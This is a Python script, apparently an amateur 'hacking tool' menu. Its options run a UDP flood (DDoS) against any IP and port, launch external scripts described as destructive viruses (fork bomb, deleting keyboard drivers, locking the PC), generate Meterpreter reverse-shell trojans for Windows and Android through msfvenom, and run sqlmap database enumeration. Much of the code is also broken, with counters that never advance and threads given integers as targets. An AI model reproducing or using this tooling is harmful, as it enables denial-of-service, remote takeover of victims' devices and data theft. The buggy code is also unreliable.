#Made By UTQ
#Discord: Utq-li15101#1830

import os
import threading
import time
import socket
import random

def choice():
    choice = int(input("1: Port Scan\n2: Find User Social Media\n3: Admin Panel Finder\n4: Ddos Attack\n5: Create Virus\n6: Create Trojan\nEnter the command: "))

    if choice == 1:
        try:
            port_scan_ip = input("Enter ip: ")
            port_secenek = int(input("1: Fast Scan\n2: Service and Version Information\n3: Operating System Information"))
            if port_secenek == 1:
                os.system(f"nmap {port_scan_ip}")
            elif port_secenek == 2:
                os.system(f"nmap -sS -sV {port_scan_ip}")
            elif port_secenek == 3:
                os.system(f"nmap -O {port_scan_ip}")
            else:
                print("Invalid number!")
                choice()
        except ValueError:
            print("Error!")
    elif choice == 2:
        find_user = input("Enter nickname: ")
        print(f"Facebook : https://www.facebook.com/{find_user}\nInstagram : https://www.instagram.com/{find_user}\nTwitter : https://www.twitter.com/{find_user}\nYoutube : https://www.youtube.com/{find_user}\nBlogger : https://{find_user}.blogspot.com\nReddit : https://www.reddit.com/user/{find_user}\nGithub : https://www.github.com/{find_user}\nSteam : https://steamcommunity.com/id/{find_user}\nVK : https://vk.com/{find_user}\nSpotify : https://open.spotify.com/user/{find_user}\nWattpad : https://www.wattpad.com/user/{find_user}\nWordpress : https://{find_user}.wordpress.com\nPinterest : https://www.pinterest.com/{find_user}\n Tumblr : https://{find_user}.tumblr.com\nFlickr : https://www.flickr.com/people/{find_user}\nSoundCloud : https://soundcloud.com/{find_user}")
    elif choice == 3:
        url = input("Enter url : ")
        print("Wait...")
        time.sleep(2)
        print(f"{url}/admin.php\n{url}/admin.html\n{url}/administrator\n{url}/admin\n{url}/adminpanel\n{url}/cpanel\n{url}/login\n{url}/wp-login.php\{url}/admins\n{url}/logins\n{url}/admin.asp\n{url}/adm\n{url}/admin/account.html\n{url}/admin/login.html\n{url}/admin/login.htm\n{url}/admin/controlpanel.html\n{url}/admin.htm\n{url}/admin/controlpanel.htm\n{url}admin/adminLogin.html\n{url}admin/adminLogin.htm")
    elif choice == 4:
        ddos_choice = int(input("1500 byte = 1\n5000 byte = 2\n10.000 byte = 3\n20.000 byte = 4\n40.000 byte = 5\nProfessionel Ddos Attack = 6 (Demo)\nEnter the command: "))
        if ddos_choice == 1:
            ddos_ip = input("Enter ip: ")
            ddos_port = int(input("Enter port: "))
            ddos_byte = random._urandom(1500)
            ddos_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sayac = 0
            while True:
                ddos_socket.sendto(ddos_byte,(ddos_ip, ddos_port))
                sayac = sayac+1
                print(f"Send Packet {sayac}")
        elif ddos_choice == 2:
            ddos_ip = input("Enter ip: ")
            ddos_port = int(input("Enter port: "))
            ddos_byte = random._urandom(5000)
            ddos_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sayac = 0
            while True:
                ddos_socket.sendto(ddos_byte,(ddos_ip, ddos_port))
                sayac + 1
                print(f"Send Packet{sayac}")
        elif ddos_choice == 3:
            ddos_ip = input("Enter ip: ")
            ddos_port = int(input("Enter port: "))
            ddos_byte = random._urandom(10000)
            ddos_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sayac = 0
            while True:
                ddos_socket.sendto(ddos_byte,(ddos_ip, ddos_port))
                sayac + 1
                print(f"Send Packet{sayac}")
        elif ddos_choice == 4:
            ddos_ip = input("Enter ip: ")
            ddos_port = int(input("Enter port: "))
            ddos_byte = random._urandom(20000)
            ddos_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sayac = 0
            while True:
                ddos_socket.sendto(ddos_byte,(ddos_ip, ddos_port))
                sayac + 1
                print(f"Send Packet{sayac}")
        elif ddos_choice == 5:
            ddos_ip = input("Enter ip: ")
            ddos_port = int(input("Enter port: "))
            ddos_byte = random._urandom(40000)
            ddos_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sayac = 0
            while True:
                ddos_socket.sendto(ddos_byte,(ddos_ip, ddos_port))
                sayac + 1
                print(f"Send Packet{sayac}")
        elif ddos_choice == 6:
            ddos_ip = input("Enter ip: ")
            ddos_port = int(input("Enter port: "))
            ddos_byte = random._urandom(25000)
            ddos_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sayac = 0
            while True:
                dos = ddos_socket.sendto(bytes,(ddos_ip, ddos_port))
                dos2 = ddos_socket.sendto(bytes,(ddos_ip, ddos_port))
                dos3 = ddos_socket.sendto(bytes,(ddos_ip, ddos_port))
                dos4 = ddos_socket.sendto(bytes,(ddos_ip, ddos_port))
                dos5 = ddos_socket.sendto(bytes,(ddos_ip, ddos_port))
                dos6 = ddos_socket.sendto(bytes,(ddos_ip, ddos_port))
                dos7 = ddos_socket.sendto(bytes,(ddos_ip, ddos_port))
                dos8 = ddos_socket.sendto(bytes,(ddos_ip, ddos_port))
                dos9 = ddos_socket.sendto(bytes,(ddos_ip, ddos_port))
                dos10 = ddos_socket.sendto(bytes,(ddos_ip, ddos_port))
                sayac = 0
                sayac + 1
                print(f"Send Packet{sayac}")
            t1 = threading.Thread(target=dos)
            t2 = threading.Thread(target=dos2)
            t3 = threading.Thread(target=dos3)
            t4 = threading.Thread(target=dos4)
            t5 = threading.Thread(target=dos5)
            t6 = threading.Thread(target=dos6)
            t7 = threading.Thread(target=dos7)
            t8 = threading.Thread(target=dos8)
            t9 = threading.Thread(target=dos9)
            t10 = threading.Thread(target=dos10)

            t1.start()
            t2.start()
            t3.start()
            t4.start()
            t5.start()
            t6.start()
            t7.start()
            t8.start()
            t9.start()
            t10.start()


        else:
            print("Invalid number!")
            choice()

    elif choice == 5:
        virus_choice = int(input("1: Unlimited cmd opening\n2: It opens 100s of programs at the same time, damaging the RAM and processor. It puts a password on the PC. It shuts down the PC after a while. It deletes the Keyboard drv file and closes important applications. It fills the desktop with folders. You can print it as a bat.\n3: Fork Bomb\n4: Staying on the lock screen all the time"))
        if virus_choice == 1:
            try:
                os.system("python3 virus.py")
            except FileNotFoundError:
                print("File not found!")
        elif virus_choice == 2:
            try:
                os.system("python3 virus2.py")
            except FileNotFoundError:
                print("File not found!")
        elif virus_choice == 3:
            try:
                os.system("python3 virus3.py")
            except FileNotFoundError:
                print("File not found!")
        elif virus_choice == 4:
            try:
                os.system("python3 virus4.py")
            except FileNotFoundError:
                print("File not found!")
        else:
            print("Invalid number!")
            choice()
    elif choice == 6:
        trojan_ip = input("Enter ip: ")
        trojan_port = input("Enter port: ")
        print("1: windows/meterpreter/reverse_tcp\n2: windows/meterpreter/reverse_http\n3: windows/meterpreter/reverse_https\n4: android/meterpreter/reverse_tcp\n5: android/meterpreter/reverse_http\n6: android/meterpreter/reverse_https")

        trojan_payload = input("Enter Payload no (1, 2, 3): ")
        trojan_registiration = input("Enter your registration location: ")
        if trojan_payload == 1:
            os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={trojan_ip} LPORT={trojan_port} -f exe -o {trojan_registiration}")
        elif trojan_payload == 2:
            os.system(f"msfvenom -p windows/meterpreter/reverse_http LHOST={trojan_ip} LPORT={trojan_port} -f exe -o {trojan_registiration}")
        elif trojan_payload == 3:
            os.system(f"msfvenom -p windows/meterpreter/reverse_https LHOST={trojan_ip} LPORT={trojan_port} -f exe -o {trojan_registiration}")
        elif trojan_payload == 4:
            os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={trojan_ip} LPORT={trojan_port} -f apk -o {trojan_registiration}")
        elif trojan_payload == 5:
            os.system(f"msfvenom -p android/meterpreter/reverse_http LHOST={trojan_registiration} LPORT={trojan_port} -f apk -o {trojan_registiration}")
        elif trojan_payload == 6:
            os.system(f"msfvenom -p android/meterpreter/reverse_https LHOST={trojan_ip} LPORT={trojan_port} -f apk -o {trojan_registiration}")
        else:
            print("Invalid number!")
            choice()

    elif choice == 7:
        sqlmap_choice = int(input("1: I Know the Open Site\n2: I Know the Name of the Open Site and Database\n3: I Know the Open Site, Database Name and Table Name\n"))
        if sqlmap_choice == 1:
            sqlmap_url = input("Enter url: ")
            os.system(f"sqlmap -u {sqlmap_url} --dbs --random-agent")
        elif sqlmap_choice == 2:
            sqlmap_url = input("Enter url: ")
            sqlmap_database = input("Enter database: ")
            os.system(f"sqlmap -u {sqlmap_url} -D {sqlmap_database} --tables --random-agent")
        elif sqlmap_choice == 3:
            sqlmap_url = input("Enter url: ")
            sqlmap_database = input("Enter database: ")
            sqlmap_table = input("Enter table name: ")
            os.system(f"sqlmap -u {sqlmap_url} -D {sqlmap_database} -T {sqlmap_table} --columns --random-agent")
        else:
            print("Invalid Number!")
            choice()
    elif choice == 8:
        pass
    else:
        print("Invalid number!")
        os.system("clear")
        choice()

choice()
